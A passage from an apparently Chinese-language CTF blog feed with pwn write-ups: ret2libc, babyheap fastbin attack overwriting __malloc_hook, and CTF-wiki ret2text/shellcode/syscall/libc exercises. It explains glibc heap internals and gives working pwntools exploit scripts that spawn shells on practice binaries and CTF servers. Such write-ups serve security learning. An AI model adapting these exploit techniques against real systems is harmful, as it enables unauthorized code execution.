class="string">&#x27;a&#x27;</span>*<span class="number">40</span>+p64(<span class="number">0x400733</span>)+p64(binsh_addr)+p64(sys_addr)+p64(<span class="number">0</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn2-sctf-2016"><a href="#pwn2-sctf-2016" class="headerlink" title="pwn2_sctf_2016"></a>pwn2_sctf_2016</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29130</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">format_str = <span class="number">0x080486F8</span></span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;read? &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;data!\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span> + p32(printf_plt)+p32(main_addr)+p32(format_str)+p32(printf_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;said: &#x27;</span>)<span class="comment">#这是程序正常输出的</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;said: &#x27;</span>)<span class="comment">#这是printf的那个格式化字符串</span></span><br><span class="line">printf_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;printf&#x27;</span>, printf_addr)</span><br><span class="line">libc_base = printf_addr - libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">str_bin = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;read? &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;data!\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span> + p32(sys_addr) + p32(main_addr) + p32(str_bin))</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment">#复制自https://blog.csdn.net/qinying001/article/details/104374305</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;i386&quot;</span>, log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./test1&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./test1&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read_got = elf.got[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&quot;main&quot;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> *(<span class="number">0xC8</span>+<span class="number">4</span>) + p32(write_plt)</span><br><span class="line">payload += p32(main_addr)</span><br><span class="line">payload += p32(<span class="number">1</span>) + p32(read_got) + p32(<span class="number">4</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Welcome!\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">read_addr = u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="comment"># libc = LibcSearcher(&quot;read&quot;, read_addr)</span></span><br><span class="line">libc_base = read_addr - libc.dump(<span class="string">&quot;read&quot;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * (<span class="number">0xC8</span>+<span class="number">4</span>) + p32(system_addr)</span><br><span class="line">payload += p32(main_addr)</span><br><span class="line">payload += p32(binsh_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Welcome!\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>babyheap_0ctf_2017</title>
      <link href="/2021/11/15/%E5%A0%86%E6%BA%A2%E5%87%BA/"/>
      <url>/2021/11/15/%E5%A0%86%E6%BA%A2%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<p>堆溢出</p><span id="more"></span><h2 id="malloc-chunk的结构"><a href="#malloc-chunk的结构" class="headerlink" title="malloc_chunk的结构"></a>malloc_chunk的结构</h2><p>参考文章：<a href="https://blog.csdn.net/weixin_43847969/article/details/104897249">https://blog.csdn.net/weixin_43847969/article/details/104897249</a></p><p><img src="https://img-blog.csdnimg.cn/20200316131506363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzg0Nzk2OQ==,size_16,color_FFFFFF,t_70"></p><p>pre_size:</p><p>这个参数分两种情况，一种情况记录大小，一种情况记录数据<br>当前一个chunk的状态是空闲时记录大小（也就是被free的时候），<br>当前一个chunk的状态不是空闲的时候，记录它的数据。<br>然后是</p><p>size：</p><p>就是这个chunk的大小,size的最后3个比特位对大小没有影响，但是要表示了一些东西<br>分别是non_main_arena :记录当前chunk是否属于主线程<br>is_mapped：当前chunk是否由mmap分配<br>prev_inuse：记录前一个chunk是否被分配（这个最重要，因为我们当这个参数为0时，我们能够通过它获得上一个chunk的大小和地址）</p><p>fd,bk:</p><p>表示用户数据，或者表示地址<br>chunk非空闲时，fd和bk存在的地方表示的是用户的数据，<br>chunk空闲时，fd存储下一个空闲的chunk，bk指向上一个空闲的chunk，这个非物理相邻表示的意思是，这个上一个和下一个表示的是被free的顺序，而不是地址上的相邻。</p><h2 id="chunk的结构"><a href="#chunk的结构" class="headerlink" title="chunk的结构"></a>chunk的结构</h2><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111150944434.png" alt="在这里插入图片描述"></p><p>第一个是size of previous（前一个chunk的大小，如果前一个chunk空闲的话）<br>第二个size of chunk 当前chunk的大小，然后再末尾有3个比特位amp分别代表上面介绍过的3个参数<br>第三个就是存储数据的部分<br>然后就到了下一个chunk(next_chunk)，我们把这个next_chunk称为chunk2,上面的chunk称为chunk1，可以看到如果chunk1正在使用的话，那么chunk的头部位置，也就是prev_size，会被chunk1使用<br>然后chunk2的第二行的后三个比特位也分别是A01，A代表着是否属于主线程（这里我们不知道所以用A代替），0代表着当前chunk不是由mmap分配，1代表着前一个chunk已经被分配。</p><p>chunk被free后结构变化：</p><p><img src="https://img-blog.csdnimg.cn/20200316134429623.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzg0Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>第一行,没变化，因为它是chunk1<br>第二行开始，M的位置变成了0，代表着chunk不是由mmap分配<br>第三行开始，原本存储数据的部分变成了forward pointer to next chunk in list<br>也就是fd，前面已经介绍过了，这个地方如果被使用的时候是数据，如果被free了，那么就存储的是下一个空闲的chunk，下面的back pointer to previous chunk in list（bk）同理.<br>然后就到了unused space，（maybe 0 bytes long），没有使用过的空间，这时候应该被收集到各种bin中去。<br>然后就到了chunk2,第一行记录当前chunk的大小，（并且不会被前一个chunk占用）<br>第二行记录前一个chunk的大小，并且末尾三位变成了A00,（这时候如果这个是堆中第一个被分配的chunk的话我们能通过prev_size字段获取上一个chunk的大小以及地址。）<br><img src="https://img-blog.csdnimg.cn/20200316135249139.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzg0Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>chunk的空间复用：</p><p><img src="https://img-blog.csdnimg.cn/20200316133135882.png" alt="在这里插入图片描述"></p><h2 id="bin及分类"><a href="#bin及分类" class="headerlink" title="bin及分类"></a>bin及分类</h2><p><img src="https://img-blog.csdnimg.cn/20200316135544629.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzg0Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="fast-bins"><a href="#fast-bins" class="headerlink" title="fast bins"></a>fast bins</h3><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202111150958166.png" alt="在这里插入图片描述"></p><h3 id="small-bins"><a href="#small-bins" class="headerlink" title="small bins"></a>small bins</h3><h3 id="large-bins"><a href="#large-bins" class="headerlink" title="large bins"></a>large bins</h3><h3 id="unsorted-bins"><a href="#unsorted-bins" class="headerlink" title="unsorted bins"></a>unsorted bins</h3><p>未被分类，刚被free未真的进入bin</p><p>Top Chunk</p><p><img src="https://img-blog.csdnimg.cn/20200316140527864.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80Mzg0Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h1 id="babyheap-0ctf-2017"><a href="#babyheap-0ctf-2017" class="headerlink" title="babyheap_0ctf_2017"></a>babyheap_0ctf_2017</h1><p>考点： fastbin attack</p><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>两次 double free 与 fastbin attack 。<br>第一次先泄露 libc 地址，然后找到构造 fake chunk 的地址。<br>第二次通过构造的 fake chunk 堆溢出覆写 __malloc_hook 完成 get shell 。</p><h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><p>1、通过unsortedbin attack 来泄露libc地址</p><p>首先应该记住这样一条规律：当small chunk被释放时，它的fd、bk指向一个指针，这个指针指向top chunk地址，这个指针保存在main_arena的0x58偏移处，而main_arena是libc的data段中，是全局静态变量，所以偏移也是固定的，根据这些就可以计算出libc的基地址了，所以<em><strong>重点是当small chunk释放时，能读出fd 或者 bk的值</strong></em></p><p>我首先通过如下重叠两个块来泄漏libc的地址（也是常见的攻击）。<br><img src="https://img-blog.csdnimg.cn/20201002095257731.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21jbXV5YW5nYQ==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>payload:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29370</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./babyheap&#x27;)</span></span><br><span class="line">p.readuntil(<span class="string">&#x27;Command:&#x27;</span>)</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span>(<span class="params">a</span>):</span></span><br><span class="line">    p.writeline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.readuntil(<span class="string">&#x27;Size:&#x27;</span>)</span><br><span class="line">    p.writeline(<span class="built_in">str</span>(a))</span><br><span class="line">    <span class="comment">#p.readuntil(&#x27;Command:&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">a,b,c</span>):</span></span><br><span class="line">    p.writeline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.readuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    p.writeline(<span class="built_in">str</span>(a))</span><br><span class="line">    p.readuntil(<span class="string">&#x27;Size:&#x27;</span>)</span><br><span class="line">    p.writeline(<span class="built_in">str</span>(b))</span><br><span class="line">    p.readuntil(<span class="string">&#x27;Content:&#x27;</span>)</span><br><span class="line">    p.write(c)</span><br><span class="line">    p.readuntil(<span class="string">&#x27;Command:&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">a</span>):</span>  </span><br><span class="line">    p.writeline(<span class="string">&#x27;3&#x27;</span>)   </span><br><span class="line">    p.readuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    p.writeline(<span class="built_in">str</span>(a))</span><br><span class="line">    p.readuntil(<span class="string">&#x27;Command:&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">a</span>):</span></span><br><span class="line">    p.writeline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.readuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">    p.writeline(<span class="built_in">str</span>(a))</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x18</span>) <span class="comment">#0</span></span><br><span class="line">alloc(<span class="number">0x18</span>) <span class="comment">#1</span></span><br><span class="line">alloc(<span class="number">0x68</span>) <span class="comment">#2</span></span><br><span class="line">alloc(<span class="number">0x68</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">update(<span class="number">0</span>, <span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x91</span>)) <span class="comment">#size1+size2</span></span><br><span class="line">dele(<span class="number">1</span>) <span class="comment">#1    #free1</span></span><br><span class="line">alloc(<span class="number">0x18</span>)   <span class="comment">#alloc1</span></span><br><span class="line">show(<span class="number">2</span>)     <span class="comment">#fd, bk at alloc2</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">libcbase = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line">log.info(<span class="built_in">hex</span>(libcbase))</span><br><span class="line">malloc_hook = libcbase + <span class="number">0x3c4aed</span></span><br><span class="line">log.info(<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">one = libcbase + <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">2</span>)  <span class="comment">#free2</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">update(<span class="number">1</span>, <span class="number">0x28</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x71</span>)+p64(malloc_hook))   <span class="comment">#fd at 2-&gt;malloc_hook</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x68</span>)  <span class="comment">#2</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">alloc(<span class="number">0x68</span>)  <span class="comment">#4 at malloc_hook</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">update(<span class="number">4</span>, <span class="number">0x1b</span>, p8(<span class="number">2</span>)*<span class="number">3</span>+p64(<span class="number">2</span>)*<span class="number">2</span>+p64(one))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">alloc(<span class="number">255</span>) </span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CTF-WIKI-pwn-基本ROP 漏洞复现</title>
      <link href="/2021/11/11/ROP/"/>
      <url>/2021/11/11/ROP/</url>
      
        <content type="html"><![CDATA[<h1 id="基本ROP"><a href="#基本ROP" class="headerlink" title="基本ROP"></a>基本ROP</h1><span id="more"></span><h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>首先检查程序的保护机制。</p><p><img src="https://img-blog.csdnimg.cn/2019022710543258.png" alt="img"></p><p>关于各个保护机制的介绍 :<a href="https://www.cnblogs.com/Spider-spiders/p/8798628.html">https://www.cnblogs.com/Spider-spiders/p/8798628.html</a></p><p>看到只开启了NX保护，即不可在栈上执行代码。</p><p>使用IDA查看源码，可以看到这里有一个危险的gets函数</p><p><img src="https://img-blog.csdnimg.cn/20190227111810747.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4MDI1MzY1,size_16,color_FFFFFF,t_70" alt="img"></p><p>以及这里有一个system函数</p><p><img src="https://img-blog.csdnimg.cn/20190227111904256.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4MDI1MzY1,size_16,color_FFFFFF,t_70" alt="img"></p><p> <img src="https://img-blog.csdnimg.cn/20190227111935558.png" alt="img"></p><p>所以如果能直接返回到0x804863A，即可执行该函数。</p><p>在GDB中对main函数里的gets函数下断点。</p><p><img src="https://img-blog.csdnimg.cn/20190227112321284.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/20190227112412951.png" alt="img"></p><p>可以看到，存储局部变量 s(eax) 位于esp中存储</p><p>查看esp和ebp得知</p><p><img src="https://img-blog.csdnimg.cn/201902271125369.png" alt="img"></p><p>s的地址为0xffffcecc</p><p>ebp地址为0xffffcf38</p><p><img src="https://img-blog.csdnimg.cn/20190227112810664.png" alt="img"></p><p>两者距离108个字节</p><p>所以108+4=112即为返回地址的地址。( 因为没有开启canary，ebp上就是返回地址的值了。)</p><p><img src="https://img-blog.csdnimg.cn/20190227113810258.png" alt="img"></p><p>python脚本，我会给出注释</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">sh = process(<span class="string">&#x27;./ret2text&#x27;</span>) <span class="comment">#本地链接到文件</span></span><br><span class="line">target = <span class="number">0x804863a</span> <span class="comment">#执行system(&#x27;/bin/sh&#x27;)函数的地址</span></span><br><span class="line">sh.sendline(<span class="string">&#x27;A&#x27;</span> * <span class="number">112</span> + p32(target)) <span class="comment"># 112是上面计算出来的s距离返回地址的字节距离</span></span><br><span class="line">sh.interactive() <span class="comment">#进行交互</span></span><br></pre></td></tr></table></figure><h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><p>先检查程序的保护机制</p><p><img src="https://img-blog.csdnimg.cn/20190227164142987.png" alt="img"></p><p>全部关闭，并且通过RELRO 为Partial 部分模式，得知程序存在存在可读可写可执行段。</p><p><img src="https://img-blog.csdnimg.cn/20190227164305727.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4MDI1MzY1,size_16,color_FFFFFF,t_70" alt="img"></p><p>通过IDA观察得知，这次同样使用不安全的gets输入，并且将输入完的值拷贝至buf2，观察buf2是什么样的一块内存。</p><p><img src="https://img-blog.csdnimg.cn/20190227164359894.png" alt="img"></p><p>buf是一块位于bss段的可读可写可执行段。所以泄露思路为:</p><p>将shellcode拷贝至buf2里，然后通过堆栈溢出将函数返回到执行buf2即可。</p><p>在gets函数处下断点</p><p><img src="https://img-blog.csdnimg.cn/20190227165108812.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/20190227165123143.png" alt="img"></p><p>得知s地址为0xffffcecc，ebp地址为0xffffcf38</p><p>ebp+4即为函数返回地址。</p><p>所以0xcf38-0xcecc+4即为s与返回地址之间的字节距离。</p><p>写python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.binary = <span class="string">&#x27;ret2shellcode&#x27;</span> <span class="comment">#全局自动设置架构类型与os类型</span></span><br><span class="line">sh=process(<span class="string">&#x27;./ret2shellcode&#x27;</span>) <span class="comment">#本地连接</span></span><br><span class="line">target=<span class="number">0x804A080</span><span class="comment">#buf2的地址</span></span><br><span class="line">shellcode=asm(shellcraft.sh())<span class="comment">#产生以一个最简单的执行system(&#x27;/bin/sh&#x27;)的shellcode 并进行汇编</span></span><br><span class="line"><span class="built_in">print</span>(p32(target))</span><br><span class="line">payload=shellcode.ljust(<span class="number">0xcf38</span>-<span class="number">0xcecc</span>+<span class="number">4</span>,<span class="string">&#x27;A&#x27;</span>)+p32(target)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><p>先检查开启了哪些防护措施</p><p><img src="https://img-blog.csdnimg.cn/20190227225033419.png" alt="img"></p><p>开启了NX保护，所以无法在栈上直接执行代码。</p><p>使用IDA查看，仍然是gets函数导致的栈溢出。</p><p>使用系统调用来完成漏洞利用。</p><p><img src="https://img-blog.csdnimg.cn/20190227225149853.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4MDI1MzY1,size_16,color_FFFFFF,t_70" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/20190227225240795.png" alt="img"></p><p>找到pop eax,ret，以同样的方法找到ebx.ecx.edx 以及int 80h系统调用和bin/sh</p><p><img src="https://img-blog.csdnimg.cn/20190227225941829.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/20190227230001980.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/20190227230010832.png" alt="img"></p><p>接下来要了解payload这样构成的原因，需要知道这三个指令</p><p><img src="https://img-blog.csdnimg.cn/20190227230150786.png" alt="img"></p><p>在堆栈里，我们知道ebp+4的地方为返回地址。这是因为leave 时 esp=ebp+4,ret 将当前esp指向的值作为返回地址跳转并且ESP+4。</p><p>所以构造payload为 payload = flat([‘A’ * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])</p><p>先用112个A填充，pop_eax_ret为第一个返回地址，然后ESP指向0xb,以此类推。</p><p>写出python脚本，之前都解释过 不再注释了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line">context.binary= <span class="string">&#x27;rop&#x27;</span></span><br><span class="line"></span><br><span class="line">binsh = <span class="number">0x80be409</span></span><br><span class="line">int_0x80 = <span class="number">0x8049421</span></span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">&#x27;A&#x27;</span> * <span class="number">112</span>, pop_eax_ret, <span class="number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, binsh, int_0x80])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h2><p>给出got表 PLT表 以及libc的相关解释，我觉得写的很清楚</p><p><a href="https://blog.csdn.net/Retrovich/article/details/82973086">https://blog.csdn.net/Retrovich/article/details/82973086</a></p><p>基本流程仍然相似，先检查保护</p><p><img src="https://img-blog.csdnimg.cn/20190228112803224.png" alt="img"></p><p>只打开了NX</p><p>检查是否存在/bin/sh</p><p><img src="https://img-blog.csdnimg.cn/20190228122346772.png" alt="img"></p><p>在IDA中查找system函数</p><p><img src="https://img-blog.csdnimg.cn/20190228113556749.png" alt="img"></p><p>查看到ptl处的system函数</p><p>写Python脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.binary = <span class="string">&#x27;ret2libc1&#x27;</span></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2libc1&#x27;</span>)</span><br><span class="line">binsh = <span class="number">0x8049720</span></span><br><span 